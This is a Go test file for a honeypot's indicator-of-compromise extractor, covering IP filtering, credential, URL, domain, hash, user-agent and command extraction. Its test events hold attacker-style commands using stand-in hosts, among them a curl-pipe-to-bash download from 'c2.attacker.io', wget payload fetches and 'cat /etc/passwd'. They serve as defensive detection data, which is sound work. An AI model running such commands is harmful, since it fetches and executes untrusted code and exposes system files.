package intelligence

import (
	"fmt"
	"testing"
	"time"

	"github.com/qpot/qpot/internal/database"
)

func makeIOCEvent(sourceIP, eventType, command string, meta map[string]string) *database.Event {
	return &database.Event{
		Timestamp: time.Now().UTC(),
		Honeypot:  "cowrie",
		SourceIP:  sourceIP,
		EventType: eventType,
		Command:   command,
		Metadata:  meta,
	}
}

func findIOCByType(iocs []*database.IOC, t string) *database.IOC {
	for _, ioc := range iocs {
		if ioc.Type == t {
			return ioc
		}
	}
	return nil
}

// ---- private IP filtering ----

func TestExtractSkipsPrivateIPv4(t *testing.T) {
	private := []string{
		"10.0.0.1", "10.255.255.255",
		"172.16.0.1", "172.31.255.255",
		"192.168.0.1", "192.168.255.255",
		"127.0.0.1", "127.255.255.255",
		"169.254.0.1", "169.254.255.255",
	}
	e := NewExtractor()
	for _, ip := range private {
		ev := makeIOCEvent(ip, "connection", "", nil)
		iocs := e.Extract(ev)
		for _, ioc := range iocs {
			if ioc.Type == IOCTypeIP {
				t.Errorf("private IP %s should not be extracted as IOC", ip)
			}
		}
	}
}

func TestExtractSkipsIPv6Private(t *testing.T) {
	private := []string{"::1", "fc00::1", "fe80::1"}
	e := NewExtractor()
	for _, ip := range private {
		ev := makeIOCEvent(ip, "connection", "", nil)
		iocs := e.Extract(ev)
		for _, ioc := range iocs {
			if ioc.Type == IOCTypeIP {
				t.Errorf("private IPv6 %s should not be extracted as IOC", ip)
			}
		}
	}
}

func TestExtractPublicIP(t *testing.T) {
	e := NewExtractor()
	ev := makeIOCEvent("203.0.113.1", "connection", "", nil)
	iocs := e.Extract(ev)
	found := findIOCByType(iocs, IOCTypeIP)
	if found == nil {
		t.Fatal("expected public IP IOC, got none")
	}
	if found.Value != "203.0.113.1" {
		t.Errorf("got IP %q, want 203.0.113.1", found.Value)
	}
}

// ---- credential extraction ----

func TestExtractCredential(t *testing.T) {
	e := NewExtractor()
	ev := &database.Event{
		Honeypot:  "cowrie",
		SourceIP:  "203.0.113.1",
		EventType: "login_failed",
		Username:  "admin",
		Password:  "Password123!",
		Timestamp: time.Now().UTC(),
	}
	iocs := e.Extract(ev)
	found := findIOCByType(iocs, IOCTypeCredential)
	if found == nil {
		t.Fatal("expected credential IOC, got none")
	}
	if found.Value != "admin:Password123!" {
		t.Errorf("unexpected credential value %q", found.Value)
	}
}

func TestExtractNoCredentialWhenMissingPart(t *testing.T) {
	e := NewExtractor()
	// Username only — no password
	ev := &database.Event{
		Honeypot:  "cowrie",
		SourceIP:  "203.0.113.1",
		EventType: "login_failed",
		Username:  "admin",
		Timestamp: time.Now().UTC(),
	}
	iocs := e.Extract(ev)
	for _, ioc := range iocs {
		if ioc.Type == IOCTypeCredential {
			t.Error("should not extract credential when password is missing")
		}
	}
}

// ---- URL + domain extraction ----

func TestExtractURL(t *testing.T) {
	e := NewExtractor()
	ev := makeIOCEvent("203.0.113.1", "command",
		"wget http://malicious.example.com/backdoor.sh -O /tmp/bd", nil)
	iocs := e.Extract(ev)
	found := findIOCByType(iocs, IOCTypeURL)
	if found == nil {
		t.Fatal("expected URL IOC, got none")
	}
}

func TestExtractDomainFromURL(t *testing.T) {
	e := NewExtractor()
	ev := makeIOCEvent("203.0.113.1", "command",
		"curl -s https://c2.attacker.io/stage2.bin | bash", nil)
	iocs := e.Extract(ev)
	found := findIOCByType(iocs, IOCTypeDomain)
	if found == nil {
		t.Fatal("expected domain IOC, got none")
	}
	if found.Value != "c2.attacker.io" {
		t.Errorf("unexpected domain %q", found.Value)
	}
}

// ---- hash extraction ----

func TestExtractSHA256(t *testing.T) {
	e := NewExtractor()
	sha256 := "a3f5c9e2b1d4f7890123456789abcdef0123456789abcdef0123456789abcdef"
	ev := makeIOCEvent("203.0.113.1", "command",
		fmt.Sprintf("echo %s | md5sum", sha256), nil)
	iocs := e.Extract(ev)
	found := findIOCByType(iocs, IOCTypeHash)
	if found == nil {
		t.Fatal("expected hash IOC, got none")
	}
}

func TestExtractHashNoDoubleCounting(t *testing.T) {
	// SHA256 is 64 hex chars. Make sure it isn't also extracted as MD5/SHA1.
	e := NewExtractor()
	sha256 := "a3f5c9e2b1d4f7890123456789abcdef0123456789abcdef0123456789abcdef"
	ev := makeIOCEvent("203.0.113.1", "command", sha256, nil)
	iocs := e.Extract(ev)
	hashCount := 0
	for _, ioc := range iocs {
		if ioc.Type == IOCTypeHash {
			hashCount++
		}
	}
	if hashCount != 1 {
		t.Errorf("expected exactly 1 hash IOC, got %d", hashCount)
	}
}

// ---- user agent ----

func TestExtractUserAgent(t *testing.T) {
	e := NewExtractor()
	ev := makeIOCEvent("203.0.113.1", "http_request", "", map[string]string{
		"user_agent": "Go-http-client/1.1",
	})
	iocs := e.Extract(ev)
	found := findIOCByType(iocs, IOCTypeUserAgent)
	if found == nil {
		t.Fatal("expected user_agent IOC, got none")
	}
	if found.Value != "Go-http-client/1.1" {
		t.Errorf("unexpected UA %q", found.Value)
	}
}

// ---- command IOC ----

func TestExtractCommandIOC(t *testing.T) {
	e := NewExtractor()
	ev := makeIOCEvent("203.0.113.1", "command", "cat /etc/passwd", nil)
	iocs := e.Extract(ev)
	found := findIOCByType(iocs, IOCTypeCommand)
	if found == nil {
		t.Fatal("expected command IOC, got none")
	}
}

func TestExtractNoCommandIOCForNonCommandEvent(t *testing.T) {
	e := NewExtractor()
	ev := makeIOCEvent("203.0.113.1", "connection", "some data", nil)
	iocs := e.Extract(ev)
	for _, ioc := range iocs {
		if ioc.Type == IOCTypeCommand {
			t.Error("command IOC should only be extracted for event_type=command")
		}
	}
}

// ---- stress ----

func TestExtractStress(t *testing.T) {
	e := NewExtractor()
	for i := 0; i < 10000; i++ {
		ev := &database.Event{
			Honeypot:  "cowrie",
			SourceIP:  fmt.Sprintf("203.0.113.%d", i%254+1),
			EventType: "command",
			Username:  fmt.Sprintf("user%d", i),
			Password:  fmt.Sprintf("pass%d", i),
			Command:   fmt.Sprintf("wget http://evil%d.com/payload && chmod +x payload", i),
			Timestamp: time.Now().UTC(),
		}
		iocs := e.Extract(ev)
		if len(iocs) == 0 {
			t.Errorf("iteration %d: expected IOCs, got none", i)
		}
	}
}
